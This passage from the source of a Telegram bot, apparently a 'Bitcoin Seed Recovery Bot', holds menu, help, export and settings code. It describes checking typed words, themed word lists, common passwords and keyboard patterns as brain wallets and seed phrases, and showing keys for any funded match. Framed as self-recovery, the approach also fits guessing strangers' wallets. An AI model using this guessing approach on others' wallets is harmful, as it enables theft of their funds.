    if (totalChecks > 0) text += `<i>${totalChecks} word${totalChecks !== 1 ? 's' : ''} checked so far</i>\n`;

    const buttons = [];

    // Primary actions - what user most likely wants
    buttons.push([{ t: '\u270d\ufe0f Check a word', d: 'start:type_word' }]);
    buttons.push([
        { t: '\ud83e\udde0 Help me remember', d: 'memory:main' },
        { t: '\ud83d\udcc2 Word lists', d: 'topics_page:0' },
    ]);

    // Context-aware: show last word actions only if relevant
    if (lastWord) {
        buttons.push([
            { t: `\ud83d\udd0d Deep check "${lastWord.slice(0, 10)}"`, d: `deep:${lastWord}` },
            { t: '\ud83d\udd11 Show keys', d: `keys:${lastWord}` },
        ]);
    }

    // AI only if configured
    if (settings.get(chatId, 'ai_provider') !== 'none') {
        buttons.push([{ t: '\ud83e\udd16 AI suggestions', d: 'aisuggest:' }]);
    }

    // Secondary: compact utility row
    buttons.push([
        { t: '\ud83d\udcdc History', d: 'history:main' },
        { t: '\u2699\ufe0f Settings', d: 'settings:main' },
    ]);

    buttons.push(...webCheckerRow());

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

async function cmdHelp(chatId) {
    await telegram.sendMessageWithKeyboard(chatId,
        `\u2753 <b>How it works</b>\n\n` +
        `<b>1.</b> Type any word (e.g. your old nickname, a game character)\n` +
        `<b>2.</b> The bot checks it as a Bitcoin seed phrase and brain wallet\n` +
        `<b>3.</b> It also tests common variations (numbers, caps, years...)\n` +
        `<b>4.</b> If a match is found, you'll see the balance and keys\n\n` +
        `<b>Extra commands:</b>\n` +
        `/brain my secret phrase \u2014 multi-word passphrase\n` +
        `/deep word \u2014 extended check (300+ variations)\n` +
        `/batch w1, w2, w3 \u2014 check several words\n` +
        `/topic warcraft \u2014 explore a themed word list\n` +
        `/stop \u2014 cancel current operation`,
        telegram.buildKeyboard([
            [{ t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
        ])
    );
}

// ===== Memory Guide - unified entry point =====
async function cmdMemoryGuide(chatId) {
    const sess = session.getSession(chatId);
    const memCtx = sess.memoryContext || {};
    const hasProfile = Object.keys(memCtx).length > 0;
    const hasInterview = Object.keys(sess.interviewAnswers || {}).length > 0;
    const extractedCount = (sess.interviewExtracted || []).length;

    let text = `\ud83e\udde0 <b>Memory Guide</b>\n\n`;
    text += `Two ways to help you remember your passphrase:\n\n`;

    text += `<b>1. Quick Profile</b> \u2014 5\u20136 guided questions\n`;
    text += `   Narrows down by year, interests, word shape\n`;
    if (hasProfile) text += `   <i>\u2705 ${Object.keys(memCtx).length} answers collected</i>\n`;
    text += `\n`;

    text += `<b>2. Deep Interview</b> \u2014 7 cognitive techniques\n`;
    text += `   Context reinstatement, free association, visualization...\n`;
    if (hasInterview) text += `   <i>\u25b6 In progress: ${extractedCount} words extracted</i>\n`;

    const buttons = [];

    // Quick Profile row
    if (hasProfile) {
        const smart = wordEngine.generateSmartSuggestions(memCtx, sess.checkedWords || []);
        buttons.push([
            { t: '\ud83d\udcca View Profile', d: 'prompt:profile' },
            { t: '\u25b6\ufe0f Continue', d: 'mem:continue:next' },
        ]);
        if (smart.words.length > 0) {
            buttons.push([{ t: `\u2705 Check ${Math.min(smart.words.length, 50)} Smart Words`, d: 'smart_batch:go' }]);
        }
    } else {
        buttons.push([{ t: '\ud83e\udde0 Start Quick Profile', d: 'prompt:start' }]);
    }

    // Interview row
    if (hasInterview) {
        buttons.push([
            { t: '\u25b6\ufe0f Resume Interview', d: 'interview:resume' },
            { t: '\ud83d\udcca Results', d: 'interview:results' },
        ]);
    } else {
        buttons.push([{ t: '\ud83e\udd14 Start Deep Interview', d: 'interview:start' }]);
    }

    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// ===== Eras browser =====
async function cmdEras(chatId) {
    await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udcc5 <b>Bitcoin Eras</b>\n\n` +
        `When did you create your wallet?\n` +
        `Each era had different culture & trends.`,
        telegram.buildKeyboard([
            [{ t: '2009', d: 'era:2009' }, { t: '2010', d: 'era:2010' }, { t: '2011', d: 'era:2011' }],
            [{ t: '2012', d: 'era:2012' }, { t: '2013', d: 'era:2013' }, { t: '2014', d: 'era:2014' }],
            [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
        ])
    );
}

async function cmdListTopics(chatId) {
    const cats = Object.keys(topics.CATEGORIES);

    let text = `\ud83d\udcc2 <b>Pick a category</b>\n\n`;
    text += `Choose a topic area and I'll check every word in it.\n`;

    const buttons = [];
    // 2 categories per row for readability
    for (let i = 0; i < cats.length; i += 2) {
        const row = [];
        for (let j = i; j < Math.min(i + 2, cats.length); j++) {
            const cat = cats[j];
            const topicCount = topics.CATEGORIES[cat].length;
            const label = cat.charAt(0).toUpperCase() + cat.slice(1);
            row.push({ t: `${catIcon(cat)} ${label} (${topicCount})`, d: `cat:${cat}` });
        }
        buttons.push(row);
    }

    buttons.push(...webCheckerRow());
    buttons.push([{ t: '\u2b05\ufe0f Back', d: 'menu:main' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

function catIcon(cat) {
    const icons = {
        gaming: '\ud83c\udfae', movies: '\ud83c\udfac', tv: '\ud83d\udcfa', music: '\ud83c\udfb5',
        crypto: '\u20bf', internet: '\ud83c\udf10', personal: '\ud83d\udc64', sports: '\u26bd',
        anime: '\ud83c\udf1f',
    };
    return icons[cat] || '\ud83d\udccc';
}

async function cmdHistory(chatId) {
    const recent = session.getRecentHistory(20);
    if (recent.length === 0) {
        await telegram.sendMessageWithKeyboard(chatId,
            '\ud83d\udcdc <b>History</b>\n\n\u274c No checks yet. Send any word to start!',
            telegram.buildKeyboard([[{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]])
        );
        return;
    }

    let text = '\ud83d\udcdc <b>Recent Checks</b>\n\n';
    for (const entry of recent) {
        const icon = entry.hasBalance ? '\ud83d\udcb0' : '\u274c';
        const time = entry.ts?.slice(5, 16) || '?';
        text += `${icon} <code>${time}</code> | ${escHtml(entry.word)} | ${entry.addressCount || '?'} addrs\n`;
    }

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard([
        [{ t: '\ud83d\udce4 Export', d: 'export:main' }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ]));
}

async function cmdExport(chatId) {
    const history = session.getFullHistory();
    if (!history) {
        await telegram.sendMessage(chatId, '\u274c No history to export.');
        return;
    }
    const lines = history.split('\n').filter(Boolean);
    const date = new Date().toISOString().slice(0, 10);

    // Send as downloadable JSONL file
    try {
        await telegram.sendDocument(
            chatId,
            Buffer.from(history, 'utf8'),
            `btc-recovery-history-${date}.jsonl`,
            `\ud83d\udce4 <b>Export Complete</b>\n\n\ud83d\udcc4 ${lines.length} entries\n\ud83d\udcc5 ${date}`
        );
    } catch (e) {
        console.error('Export file send failed:', e.message);
        // Fallback to text
        await telegram.sendMessage(chatId,
            `\ud83d\udce4 <b>Export</b>: ${lines.length} entries\n\n<code>${escHtml(history.slice(0, 3500))}</code>`
        );
    }

    // Also send a readable CSV summary
    try {
        const csvLines = ['timestamp,word,mode,addresses,has_balance,balance_total'];
        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                csvLines.push(`${entry.ts || ''},${entry.word || ''},${entry.mode || ''},${entry.addressCount || 0},${entry.hasBalance || false},${entry.balanceTotal || 0}`);
            } catch (e) { /* skip bad lines */ }
        }
        await telegram.sendDocument(
            chatId,
            Buffer.from(csvLines.join('\n'), 'utf8'),
            `btc-recovery-history-${date}.csv`,
            `\ud83d\udcca <b>CSV Summary</b> \u2014 open in Excel/Google Sheets`
        );
    } catch (e) {
        console.error('CSV export failed:', e.message);
    }
}

// ===== AI Fallback provider add flow =====
async function handleAIFallbackAdd(chatId, step) {
    if (step === 'start') {
        // Show provider picker (exclude primary and already-added fallbacks)
        const primary = settings.get(chatId, 'ai_provider');
        const existingFbs = settings.getFallbacks(chatId).map(f => f.provider);
        const available = ['openai', 'claude', 'gemini', 'groq', 'ollama', 'together']
            .filter(p => p !== primary && !existingFbs.includes(p));

        if (available.length === 0) {
            await telegram.sendMessageWithKeyboard(chatId,
                'All providers are already configured.',
                telegram.buildKeyboard([[{ t: '\u2b05\ufe0f Back', d: 'settings:ai' }]])
            );
            return;
        }

        const providerLabels = {
            openai: 'OpenAI \ud83d\udd11',
            claude: 'Claude \ud83d\udd11',
            gemini: 'Gemini \ud83d\udd11',
            groq: 'Groq (Free) \ud83d\udd11',
            ollama: 'Ollama (Local) \ud83c\udd93',
            together: 'Together AI \ud83d\udd11',
        };

        const buttons = available.map(p => ([{
            t: providerLabels[p] || p,
            d: `ai_fb_add:${p}`,
        }]));
        buttons.push([{ t: '\u2b05\ufe0f Cancel', d: 'settings:ai' }]);

        await telegram.sendMessageWithKeyboard(chatId,
            '\u2795 <b>Add Fallback Provider</b>\n\nPick a backup AI provider:',
            telegram.buildKeyboard(buttons)
        );
    } else {
        // step = provider name — user selected a provider, now ask for API key
        const provider = step;
        if (provider === 'ollama') {
            // Ollama needs no key
            settings.addFallback(chatId, 'ollama', null, 'auto');
            await telegram.sendMessageWithKeyboard(chatId,
                '\u2705 <b>Ollama</b> added as fallback provider.',
                telegram.buildKeyboard([[{ t: '\u2b05\ufe0f AI Settings', d: 'settings:ai' }]])
            );
        } else {
            // Store the pending fallback provider and ask for key via text input
            const sess = session.getSession(chatId);
            sess.state = 'awaiting_fb_key';
            sess.pendingFbProvider = provider;
            await telegram.sendMessageWithKeyboard(chatId,
                `\ud83d\udd11 <b>Enter API key for ${provider}</b>\n\nPaste your API key:`,
                telegram.buildKeyboard([[{ t: '\u274c Cancel', d: 'settings:ai' }]])
            );
        }
    }
}

async function handleAIFallbackSet(chatId, value) {
    // value = provider:key
    const colonIdx = value.indexOf(':');
    if (colonIdx < 0) return;
    const provider = value.slice(0, colonIdx);
    const key = value.slice(colonIdx + 1);
    settings.addFallback(chatId, provider, key, 'auto');
    await cmdSettings(chatId, 'ai');
}

async function cmdSettings(chatId, page = 'main') {
    if (page === 'advanced') {
        const text = settings.formatAdvancedSettings(chatId);
        const buttons = telegram.buildKeyboard(settings.getAdvancedSettingsKeyboard(chatId, TELEGRAM_CHAT_ID));
        await telegram.sendMessageWithKeyboard(chatId, text + '\n\n\ud83d\udc47 Tap to toggle:', buttons);
    } else if (page === 'ai') {
        const text = settings.formatAIProviders(chatId);
        const buttons = telegram.buildKeyboard(settings.getAISettingsKeyboard(chatId));
        await telegram.sendMessageWithKeyboard(chatId, text, buttons);
    } else if (page === 'explorer') {
        const text = settings.formatExplorerKeys(chatId);
        const buttons = telegram.buildKeyboard(settings.getExplorerKeysKeyboard(chatId));
        await telegram.sendMessageWithKeyboard(chatId, text + '\n\n\ud83d\udc47 Tap a provider to set its key:', buttons);
    } else {
        const text = settings.formatSettings(chatId);
        const buttons = telegram.buildKeyboard(settings.getSettingsKeyboard(chatId));
        await telegram.sendMessageWithKeyboard(chatId, text + '\n\n\ud83d\udc47 Tap to change:', buttons);
    }
}

async function cmdStatus(chatId) {
    const stats = session.formatStats();
    const apiHealthText = '\n\n' + balanceChecker.formatApiHealth();
    await telegram.sendMessageWithKeyboard(chatId, stats + apiHealthText, telegram.buildKeyboard([
        [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ]));
}

// ===== Helper: Build results message =====
function buildResultsMessage(word, varCount, addrCount, details, balanceResults, foundBalance) {
    let text = '';

    text += `\ud83d\udd0d <b>Results for "${escHtml(word)}"</b>\n`;
    text += `\ud83c\udfb0 ${varCount} variations \u2022 \ud83c\udfe0 ${addrCount} addresses\n\n`;

    const isInBIP39 = bitcoin.isInBIP39Wordlist(word);
    text += `\ud83d\udcd6 BIP39 wordlist: ${isInBIP39 ? '\u2705 YES' : '\u274c NO'}\n`;
    if (!isInBIP39) {
        text += `   <i>(PBKDF2 still processes it as a seed)</i>\n`;
    }
    text += '\n';

    for (const detail of details.slice(0, 2)) {
        text += `\ud83d\udee0\ufe0f <b>${detail.mode}:</b>\n`;
        if (detail.result.addresses) {
            const addrs = detail.result.addresses;
            text += `  \ud83c\udfdb\ufe0f Legacy: <code>${addrs.legacy_compressed?.slice(0, 16)}...</code>\n`;
            text += `  \ud83d\udd35 Native: <code>${addrs.nativeSegwit?.slice(0, 20)}...</code>\n`;
        } else if (detail.result.pathResults) {
            const firstPath = Object.keys(detail.result.pathResults)[0];
            const firstAddr = detail.result.pathResults[firstPath]?.[0];
            if (firstAddr) {
                text += `  \ud83d\udccd ${firstAddr.path}: <code>${firstAddr.legacy?.slice(0, 16)}...</code>\n`;
            }
        }
    }

    text += '\n\ud83d\udcb0 <b>Balances:</b>\n';
    text += '  \u274c All 0 BTC\n';

    return text;
}

// ===== Progressive flow: build buttons from progressive next steps =====
function buildProgressiveButtons(nextSteps, sess, chatId) {
    const rows = [];
    const compact = [];
    const added = new Set();

    for (const step of nextSteps.suggestions.slice(0, 6)) {
        const key = `${step.action}:${step.data}`;
        if (added.has(key)) continue;
        added.add(key);

        switch (step.action) {
            case 'explore_topic': {
                const info = topics.getTopicInfo(step.data);
                if (info) {
                    rows.push([{ t: `\ud83c\udfae ${info.label}`, d: `explore:${step.data}` }]);
                }
                break;
            }
            case 'smart_batch':
                rows.push([{ t: '\ud83e\udde0 Smart Check', d: 'smart_batch:go' }]);
                break;
            case 'explore_category':
                rows.push([{ t: `\ud83d\udcc2 ${step.label}`, d: `cat:${step.data}` }]);
                break;
            case 'try_year':
                compact.push({ t: `\ud83d\udcc5 ${step.label}`, d: `era:${step.data}` });
                break;
            case 'try_common':
                compact.push({ t: `\ud83d\udd11 ${step.label}`, d: `common:${step.data}` });
                break;
            case 'memory_restart':
                compact.push({ t: '\ud83e\udde0 Rethink Memory', d: 'prompt:start' });
                break;
            case 'interview':
                compact.push({ t: '\ud83d\udcac Deep Interview', d: 'interview:start' });
                break;
            case 'dictionary':
                compact.push({ t: '\ud83d\udcd6 BIP39 Dictionary', d: 'dictionary:go' });
                break;
            case 'browse_all':
                compact.push({ t: '\ud83d\udcda Browse All Topics', d: 'topics_page:0' });
                break;
        }
    }

    // Compact items go in rows of 2-3
    for (let i = 0; i < compact.length; i += 2) {
        rows.push(compact.slice(i, i + 2));
    }

    // Always add AI if available
    if (settings.get(chatId, 'ai_provider') !== 'none') {
        rows.push([{ t: '\ud83e\udd16 AI Suggest', d: `aisuggest:${sess.lastWord || ''}` }]);
    }

    rows.push([{ t: '\u2b05\ufe0f Menu', d: 'menu:main' }]);
    return rows;
}

// ===== Handle common passwords & keyboard patterns =====
async function handleCommonWords(chatId, type) {
    const commonPasswords = [
        'password', 'password1', 'password123', '123456', '12345678', 'qwerty', 'abc123',
        'letmein', 'master', 'dragon', 'login', 'admin', 'welcome', 'monkey', 'shadow',
        'sunshine', 'princess', 'football', 'charlie', 'trustno1', 'iloveyou', 'batman',
        'superman', 'mustang', 'access', 'michael', 'secret', 'bitcoin', 'satoshi',
        'nakamoto', 'hodl', 'tothemoon', 'lambo', 'crypto', 'blockchain',
    ];
    const keyboardPatterns = [
        'qwerty', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm', 'qazwsx', 'qweasd',
        '1qaz2wsx', 'zaq1xsw2', 'qwaszx', 'asdfjkl', '1q2w3e4r', '1234qwer',
        'zxcvbn', 'poiuytrewq', 'mnbvcxz', 'lkjhgfdsa', 'abcdef', 'abcdefgh',
    ];

    const words = type === 'keyboard' ? keyboardPatterns : commonPasswords;
    session.recordStrategy(chatId, type === 'keyboard' ? 'keyboard_patterns' : 'common_passwords');
    await handleBatch(chatId, words.join(', '));
}

// ===== Apply a context pivot =====
async function handleContextPivot(chatId, key, value) {
    const sess = session.getSession(chatId);
    if (!sess.memoryContext) sess.memoryContext = {};
    const oldValue = sess.memoryContext[key];
    sess.memoryContext[key] = value;

    await telegram.sendMessage(chatId,
        `\ud83d\udd04 <b>Context pivot:</b> ${key} changed from "${oldValue || 'unset'}" \u2192 "<b>${value}</b>"\n` +
        `Let's see what this opens up...`
    );

    // Generate new suggestions with updated context
    const smart = wordEngine.generateSmartSuggestions(sess.memoryContext, sess.checkedWords || []);
    if (smart.words.length > 0) {
        await handleBatch(chatId, smart.words.join(', '));
    } else {
        await telegram.sendMessageWithKeyboard(chatId,
            `No new words from this pivot. Let's try something else.`,
            telegram.buildKeyboard([
                [{ t: '\ud83d\udcc2 Topics', d: 'topics_page:0' }, { t: '\ud83e\udde0 Memory Guide', d: 'memory:main' }],
                [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
            ])
        );
    }
}

// ===== HTML escaping =====
function escHtml(text) {
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// ===== Graceful shutdown =====
function shutdown() {
    console.log('\nShutting down...');
    isShuttingDown = true;
    stopCurrentBatch = true;
    session.saveSessions();
    settings.save();
    console.log('Sessions and settings saved.');
    process.exit(0);
}

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

// ===== Start =====
async function main() {
    console.log('Bitcoin Seed Recovery Bot');
    console.log('========================');
    console.log(`Token: ${TELEGRAM_BOT_TOKEN.slice(0, 8)}...`);
    console.log(`Chat ID: ${TELEGRAM_CHAT_ID || 'any (will respond to all)'}`);
    console.log(`Settings: variations=${settings.get('global', 'variations')}, depth=${settings.get('global', 'var_depth')}`);
    console.log(`AI: ${settings.get('global', 'ai_provider')}`);
    console.log('');

    console.log('Starting Telegram polling...');
    setInterval(() => {
        if (!isShuttingDown) pollUpdates();
    }, 2000);

    setInterval(() => {
        session.saveSessions();
    }, 300000);

    if (TELEGRAM_CHAT_ID) {
        try {
            await cmdStart(TELEGRAM_CHAT_ID);
        } catch (e) {
            console.log('Could not send startup message:', e.message);
        }
    }

    console.log('Bot is running! Press Ctrl+C to stop.\n');
}

main().catch(e => {
    console.error('Fatal error:', e);
    process.exit(1);
});
